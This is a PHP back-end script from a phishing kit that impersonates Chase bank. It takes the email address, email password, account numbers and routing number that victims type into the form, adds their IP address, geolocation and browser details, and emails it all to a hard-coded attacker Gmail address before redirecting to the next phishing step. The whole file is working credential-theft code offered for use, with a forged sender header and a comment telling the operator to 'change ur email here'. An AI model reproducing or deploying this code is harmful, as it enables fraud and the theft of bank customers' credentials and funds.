<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Chase Info-----------------------\n";
$message .= "Email Address            : ".$_POST['email']."\n";
$message .= "Email Password           : ".$_POST['pass']."\n";
$message .= "Checking Account Number 1           : ".$_POST['account1']."\n";
$message .= "Checking Account Number 2           : ".$_POST['account2']."\n";
$message .= "Saving Account Number 3           : ".$_POST['account3']."\n";
$message .= "Routing Number            : ".$_POST['rout']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Burhan-------------\n";
//change ur email here
$send = "fudpages@gmail.com";
$subject = "Result from $ip";
$headers = "From: Chase<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: step4.php");
  

?>